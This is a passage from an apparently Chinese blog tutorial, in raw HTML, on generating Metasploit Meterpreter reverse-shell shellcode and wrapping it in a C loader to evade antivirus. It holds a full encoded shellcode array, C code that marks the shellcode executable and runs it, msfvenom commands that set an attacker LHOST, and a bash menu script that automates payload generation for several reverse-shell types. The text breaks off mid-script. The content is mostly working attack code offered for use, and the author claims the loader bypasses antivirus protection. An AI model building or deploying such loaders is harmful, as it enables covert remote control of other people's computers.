class="emphasis">&quot;\x75\x55\xa9\xa8\x30\x8e\xa2\x1e\x9e\x65\xaa\x5f\xe7\x43\xc7&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x1e\x06\xc7\x6d\x0f\xb8\x09\xf1\xa7\xaa\x3e\x82\xb0\xf5\x7e&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\xf6\x08\xe1\x90\xc5\x98\xd0\x11\xe9\x78\xd6\xa6\x44\xf4\x1a&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\xe9\x7d\x83\xec\x57\xd9\xb5\x80\x0b\x5f\x98\xc8\xec\xeb\x3f&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x09\x17\xc8\xad\x8a\x5f\xc6\x6f\x8f\xa3\x11\x7c\x7c\x3e\x25&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x44\x62\xbd\xd3\x94\xe8\x0b\x3e\xd9\xbe\x05\x71\x89\x98\x6b&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\xe3\x4a\x36\x34\x9e\xa6\x90\xee\x69\x13\x16\xa0\x9a\xf5\x68&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x53\x22\xdc\x6f\x59\x54\x53\x8a\x25\x31\x40\x3e\x03\x85\xc9&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x3b\x1c\xb9\xb1\x6b\xe9\x42\xec\xda\x5f\x24\x8a\x81\x37\x90&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\xe3\xb0\xe8\xd7\xfe\x8e\xfc\x0b\xc4\xde\x75\x73\x40\x14\x24&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x2c\x03\xf0\xfd\x65\x7c\xbf\xe8\xd3\xa2\x80\x16\xd1\x32\x36&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x36\x30\x1e\x71\x4f\xe9\x60\x47\x91\xcf\x0c\xf0\xeb\xc3\xe6&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\xbf\x98\x1a\x3a\x38\xfa\x56\x40\x9e\x4e\x51\xc2\xcb\xc2\x48&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\xe5\xbf\x0d\xec\xb2\x37\x01\x9f\x7a\xdf\x3a\xde\x30\xe0\x04&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\xb6\x07\x5e\x5c\x65\x1c\xfd\x24\x02\xbd\x8f\x2c\xba\xdc\xbd&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x27\x2a\xe0\x08\x74\xf9\xda\x8b\x4a\xaf\x46\xaf\x67\xd1\x42&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x9d\xb5\x11\x70\xd7\x5c\xf0\x36\x1f\x87\x42\x99\xa4\x57\x64&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x8f\xf7\xda\x03\x42\x35\x85\x6e\xd5\x6b\xa6\xcd\xdb\x8c\x2f&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x37\x62\xef\xfe\x61\xab\xeb\xde\x37\xd8\x5e\x77\x7f\x86\x18&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x88\x80\xd4\x02\xe7\x8b&quot;;</span></span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505484635934.jpg" alt="enter description here"></p><h2 id="7-编译、监听、运行"><a href="#7-编译、监听、运行" class="headerlink" title="7.编译、监听、运行"></a>7.编译、监听、运行</h2><p>那么我们得了到了msfvenom生成的shellcode，那么我们将其带入之前弹框的hellword代码中,写出以下代码：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># include <span class="language-xml"><span class="tag">&lt;<span class="name">stdlib.h</span>&gt;</span></span></span></span><br><span class="line">  # include <span class="language-xml"><span class="tag">&lt;<span class="name">stdio.h</span>&gt;</span></span></span><br><span class="line">  # include <span class="language-xml"><span class="tag">&lt;<span class="name">string.h</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">  # include <span class="language-xml"><span class="tag">&lt;<span class="name">windows.h</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  int</span><br><span class="line">  main(void)</span><br><span class="line">  &#123;</span><br><span class="line">  char <span class="emphasis">*shellcode =</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">    #Shellcode的代码</span></span><br><span class="line"><span class="emphasis">&quot;\xd9\xe1\xbf\xc4\xbd\x41\x38\xd9\x74\x24\xf4\x5e\x31\xc9\xb1&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x68\x31\x7e\x19\x83\xee\xfc\x03\x7e\x15\x26\x48\x9a\xec\x1c&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x99\x40\x70\xdd\x07\x0e\xae\xe9\xe6\xc6\x67\xa0\x76\x28\x2e&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\xd8\x7b\x1c\xd4\x5f\x95\x5c\x0a\x80\xed\x24\xaf\x55\xee\xe0&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\xf9\x80\x7f\x1a\x88\x1f\xde\xba\xa7\x09\x17\x25\x1f\x2c\x37&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x5d\x53\x6c\x7a\x01\xd2\x99\x69\x5b\x61\x14\x0a\xe1\x2b\xe1&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x62\x0c\x07\x9b\x67\xe4\x56\x2f\xf8\xa0\x7e\xdd\xfe\x6d\x0f&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\xa2\x0e\xfc\x24\xcd\xce\xc0\xa3\x8b\x96\xe5\x1b\x26\xbd\x58&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x8d\xcc\x2b\x71\xe4\x37\xda\xb7\xca\x2e\xe1\xe2\x19\xd9\xbf&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x29\x5c\xed\x2b\x32\x0f\x9f\x81\x59\xf9\x3b\x31\x57\xe1\x38&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x75\x55\xa9\xa8\x30\x8e\xa2\x1e\x9e\x65\xaa\x5f\xe7\x43\xc7&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x1e\x06\xc7\x6d\x0f\xb8\x09\xf1\xa7\xaa\x3e\x82\xb0\xf5\x7e&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\xf6\x08\xe1\x90\xc5\x98\xd0\x11\xe9\x78\xd6\xa6\x44\xf4\x1a&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\xe9\x7d\x83\xec\x57\xd9\xb5\x80\x0b\x5f\x98\xc8\xec\xeb\x3f&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x09\x17\xc8\xad\x8a\x5f\xc6\x6f\x8f\xa3\x11\x7c\x7c\x3e\x25&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x44\x62\xbd\xd3\x94\xe8\x0b\x3e\xd9\xbe\x05\x71\x89\x98\x6b&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\xe3\x4a\x36\x34\x9e\xa6\x90\xee\x69\x13\x16\xa0\x9a\xf5\x68&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x53\x22\xdc\x6f\x59\x54\x53\x8a\x25\x31\x40\x3e\x03\x85\xc9&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x3b\x1c\xb9\xb1\x6b\xe9\x42\xec\xda\x5f\x24\x8a\x81\x37\x90&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\xe3\xb0\xe8\xd7\xfe\x8e\xfc\x0b\xc4\xde\x75\x73\x40\x14\x24&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x2c\x03\xf0\xfd\x65\x7c\xbf\xe8\xd3\xa2\x80\x16\xd1\x32\x36&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x36\x30\x1e\x71\x4f\xe9\x60\x47\x91\xcf\x0c\xf0\xeb\xc3\xe6&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\xbf\x98\x1a\x3a\x38\xfa\x56\x40\x9e\x4e\x51\xc2\xcb\xc2\x48&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\xe5\xbf\x0d\xec\xb2\x37\x01\x9f\x7a\xdf\x3a\xde\x30\xe0\x04&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\xb6\x07\x5e\x5c\x65\x1c\xfd\x24\x02\xbd\x8f\x2c\xba\xdc\xbd&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x27\x2a\xe0\x08\x74\xf9\xda\x8b\x4a\xaf\x46\xaf\x67\xd1\x42&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x9d\xb5\x11\x70\xd7\x5c\xf0\x36\x1f\x87\x42\x99\xa4\x57\x64&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x8f\xf7\xda\x03\x42\x35\x85\x6e\xd5\x6b\xa6\xcd\xdb\x8c\x2f&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x37\x62\xef\xfe\x61\xab\xeb\xde\x37\xd8\x5e\x77\x7f\x86\x18&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x88\x80\xd4\x02\xe7\x8b&quot;;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">  DWORD why_must_this_variable;</span></span><br><span class="line"><span class="emphasis">  BOOL ret = VirtualProtect(shellcode, strlen(shellcode),</span></span><br><span class="line"><span class="emphasis">  PAGE_EXECUTE_READWRITE, &amp;why_must_this_variable);</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">  if (!ret) &#123;</span></span><br><span class="line"><span class="emphasis">  printf(&quot;VirtualProtect\n&quot;);</span></span><br><span class="line"><span class="emphasis">  return EXIT_FAILURE;</span></span><br><span class="line"><span class="emphasis">  &#125;</span></span><br><span class="line"><span class="emphasis">  ((void(*</span>)(void))shellcode)();</span><br><span class="line"></span><br><span class="line">  return 0;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p> 编译可以使用vs微软的编译器也可以和我一样使用tdm-gcc。<br>  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> TDM-GCC是Windows的编译器套件。</span><br><span class="line">它结合了最新的GCC工具集的稳定版本， Windows友好的几个补丁程序，以及免费和开源的 MinGW或 MinGW-w64运行时API，以创建Microsoft的编译器和平台SDK的开源替代软件。</span><br><span class="line">它可以创建32位OR 64位二进制文​​件，适用于任何Windows版本的Windows 98。</span><br><span class="line">它具有易于使用的单文件安装程序，只需点击几下即可创建工作安装，并可在新软件包可用时更新该安装。</span><br><span class="line">它仅由命令行工具组成。如果您想要一个可视化IDE（文本编辑器，编译器接口，可视化调试器）， Code :: Blocks与TDM-GCC集成很好。</span><br></pre></td></tr></table></figure><br> 关于TDM-GCC在我的项目中有提到过 <a href="https://github.com/demonsec666/secist_script">https://github.com/demonsec666/secist_script</a></p><p>1.使用TDM-GCC 虽然有报错 ，但是也不影响最终得到会话的结果<br>2.其中的-M32 代表指的是32位 以及-W -Wall 是忽略警告的意思，其他的我就不用多说了吧<br>3.也可以使用vs进行编译生成exe。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505485668396.jpg" alt="enter description here"></p><p> <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505485903488.jpg" alt="enter description here"></p><p> <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505485863927.jpg" alt="enter description here"></p><p> 以下是我在win下编译运行测试得到的结果，也是同样绕过杀软的安全防护</p><p> <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/CACE2616E540CCD26C7E328C258F10AA.png" alt="enter description here"></p><h2 id="8-Bash下的编写思路形成懒人自动化的脚本"><a href="#8-Bash下的编写思路形成懒人自动化的脚本" class="headerlink" title="8.Bash下的编写思路形成懒人自动化的脚本"></a>8.Bash下的编写思路形成懒人自动化的脚本</h2><p>我们要考虑几点内容：<br>1.如何将我们生成的shellcode代码代入到cpp当中<br>2.如何指定ip和端口 自动化的帮我们完成所有事情</p><p> 1.如何将我们生成的shellcode代码代入到cpp当中<br> 其实我们可以使用echo大法使用重定向到缓存文件中，echo 可以使用变量符合$ 将里面的命令括起来 将其输出的内容写入到缓存文件中期<br> <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505486902561.jpg" alt="enter description here"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo $(msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse<span class="emphasis">_tcp  LHOST</span></span><br><span class="line"><span class="emphasis">=192.168.1.100 LPORTta_</span>ga<span class="emphasis">_nai -b &#x27;\x00&#x27; -i 4 -f c) &gt;&gt;  shellcode.txt</span></span><br></pre></td></tr></table></figure><p>2.写到缓存文件我们是不是马上可以放入到cpp中去呢？其实不是 细心的朋友可以发现shellcode.txt中包含着 unsigned char buf[] &#x3D; 的字符串。</p><p>所以我们需要用的一个命令 &#x3D;&gt;  sed ,使用sed 删除匹配unsigned char buf[] &#x3D; 的字符串<br>也就是说得到以下命令</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed &#x27;s/unsigned char buf\[\] =//g&#x27;</span><br></pre></td></tr></table></figure><p> 以及完整的命令就是<br> <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo $(msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse<span class="emphasis">_tcp  LHOST</span></span><br><span class="line"><span class="emphasis">=192.168.1.100 LPORTta_</span>ga<span class="emphasis">_nai -b &#x27;\x00&#x27; -i 4 -f c)  | sed &#x27;s/unsigned char buf\[\] =//g&#x27; &gt;&gt;  </span></span><br><span class="line"><span class="emphasis">shellcode.txt</span></span><br></pre></td></tr></table></figure></p><p> 第一个问题解决了 讲msfvenom的shellcode存储到缓存文件中 ，那么我们需要得到完整的cpp文件该如何做呢，<br>  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">echo $(msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse<span class="emphasis">_tcp  LHOST</span></span><br><span class="line"><span class="emphasis"> =192.168.1.100 LPORTta_</span>ga<span class="emphasis">_nai -b &#x27;\x00&#x27; -i 4 -f c)  | sed &#x27;s/unsigned char buf\[\] =//g&#x27; &gt;&gt;  </span></span><br><span class="line"><span class="emphasis"> shellcode.txt</span></span><br><span class="line"><span class="emphasis"> echo  &quot;</span></span><br><span class="line"><span class="emphasis"> # include <span class="language-xml"><span class="tag">&lt;<span class="name">stdlib.h</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis"> # include <span class="language-xml"><span class="tag">&lt;<span class="name">stdio.h</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis"> # include <span class="language-xml"><span class="tag">&lt;<span class="name">string.h</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis"> # include <span class="language-xml"><span class="tag">&lt;<span class="name">windows.h</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis"> int</span></span><br><span class="line"><span class="emphasis"> main(void)</span></span><br><span class="line"><span class="emphasis"> &#123;</span></span><br><span class="line"><span class="emphasis"> char *shellcode =</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">   $Shellcode</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis"> DWORD why_</span>must<span class="emphasis">_this_</span>variable;</span><br><span class="line"> BOOL ret = VirtualProtect(shellcode, strlen(shellcode),</span><br><span class="line"> PAGE<span class="emphasis">_EXECUTE_</span>READWRITE, &amp;why<span class="emphasis">_must_</span>this<span class="emphasis">_variable);</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis"> if (!ret) &#123;</span></span><br><span class="line"><span class="emphasis"> printf(\&quot;VirtualProtect\n\&quot;);</span></span><br><span class="line"><span class="emphasis"> return EXIT_</span>FAILURE;</span><br><span class="line"> &#125;</span><br><span class="line"> ((void(<span class="emphasis">*)(void))shellcode)();</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis"> return 0;</span></span><br><span class="line"><span class="emphasis"> &#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis"> &quot; &gt;&gt; output/shellcode.cpp</span></span><br></pre></td></tr></table></figure><br> 我们将得到的shellcode.txt 使用cat命令 将它输出 并且存储在一个变量中，如我使用的变量$shellcode，并将其变量代入到c代码中去这样也就完整的输出成我们想要的编译文件。</p><p> 2.如何指定ip和端口 自动化的帮我们完成所有事情<br> 在bash编程中我们使用read语法 ，read 就是接受用户键入的字符串。<br> 那么我们可以将其写成这样的：<br>   <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> echo -e &quot;       secist&gt;请输入你的ip地址: \c&quot;</span><br><span class="line">read ip</span><br><span class="line">echo -e &quot;       secist&gt;请输入你的端口: \c&quot;</span><br><span class="line">read port</span><br><span class="line">echo -e &quot;       secist&gt;编码次数(1-500): \c&quot;</span><br><span class="line">read encode</span><br></pre></td></tr></table></figure><br> 分别将ip地址、端口、编码迭代次数。存储到ip、port、encode变量中。</p><h2 id="9-开启上帝视角"><a href="#9-开启上帝视角" class="headerlink" title="9.开启上帝视角"></a>9.开启上帝视角</h2><p> 最终我的个人完整代码为：<br> <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line">shellcode ()&#123;</span><br><span class="line">clear</span><br><span class="line"></span><br><span class="line">echo  -e &quot;         &lt; Shellcode Payload &gt;&quot;</span><br><span class="line">echo  -e &quot;          --------------------&quot;</span><br><span class="line">echo -e &quot;                             \   ^<span class="strong">__^             &quot;</span></span><br><span class="line"><span class="strong">echo -e &quot;                              \  (oo)\__</span><span class="strong">____</span><span class="emphasis">_     &quot;</span></span><br><span class="line"><span class="emphasis">echo -e &quot;                                 (<span class="strong">__)\       )\/\ &quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">echo -e &quot;                                     ||----w |    &quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">echo -e &quot;                                     ||     ||     &quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">echo &quot;  &quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">echo -e &quot;  +------------++-------------------------++-----------------------+&quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">echo      &quot;             即刻安全周年庆版v1.7 (secist----2017.7.14)&quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">echo &quot; &quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">echo -e &quot;            你的IP地址 :\c&quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">/sbin/ifconfig -a|grep inet|grep -v 127.0.0.1|grep -v inet6|awk &#x27;&#123;print $2&#125;&#x27;|tr -d &quot;addr:&quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">echo &quot;            系统版本 :$(cat /etc/issue)&quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">echo -e &quot;  +------------++-------------------------++-----------------------+&quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">echo &quot;  &quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">echo &quot;        [1] Meterpreter_Reverse_tcp [5] Shell_reverse_tcp&quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">echo &quot;        [2] Meterpreter_Reverse_http         [6] exit&quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">echo &quot;        [3] Meterpreter_Reverse_https &quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">echo &quot;        [4] Meterpreter_Reverse_tcp_dns          &quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">echo &quot;        [7] back meun     &quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">echo &quot;&quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">echo -e &quot;              secist&gt; \c&quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">read option</span></span></span><br><span class="line"><span class="strong"><span class="emphasis"></span></span></span><br><span class="line"><span class="strong"><span class="emphasis">#Aukeratu</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">case $option in</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">1)</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">payload=&#x27;windows/meterpreter/reverse_tcp&#x27;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">;;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">2)</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">payload=&#x27;windows/meterpreter/reverse_http&#x27;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">;;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">3)</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">payload=&#x27;windows/meterpreter/reverse_https&#x27;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">;;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">4)</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">payload=&#x27;windows/meterpreter/reverse_tcp_dns&#x27;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">;;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">5)</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">payload=&#x27;windows/shell/reverse_tcp&#x27;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">;;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">6)</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">exit</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">;;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">7)</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">menu</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">;;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">*)</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">shellcode</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">;;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">esac</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">if [ &quot;$option&quot; == &quot;1&quot; ]; then</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  shellcode1</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">elif [ &quot;$option&quot; == &quot;2&quot; ]; then</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  shellcode1</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">elif [ &quot;$option&quot; == &quot;3&quot; ]; then</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  shellcode1</span></span></span><br><span class="line"><span class="strong"><span class="emphasis"></span></span></span><br><span class="line"><span class="strong"><span class="emphasis">elif [ &quot;$option&quot; == &quot;4&quot; ]; then</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  shellcode1</span></span></span><br><span class="line"><span class="strong"><span class="emphasis"></span></span></span><br><span class="line"><span class="strong"><span class="emphasis">elif [ &quot;$option&quot; == &quot;5&quot; ]; then</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  shellcode1</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  </span></span></span><br><span class="line"><span class="strong"><span class="emphasis"> elif [ &quot;$option&quot; == &quot;6&quot; ]; then</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">    exit</span></span></span><br><span class="line"><span class="strong"><span class="emphasis"></span></span></span><br><span class="line"><span class="strong"><span class="emphasis"> elif [ &quot;$option&quot; == &quot;7&quot; ]; then</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">    menu</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  fi</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">&#125;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis"></span></span></span><br><span class="line"><span class="strong"><span class="emphasis">shellcode1()&#123;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">#定义了一个菜单为shellcode1</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  echo -e &quot;       secist&gt;请输入你的ip地址: \c&quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  read ip</span></span></span><br><span class="line"><span class="strong"><span 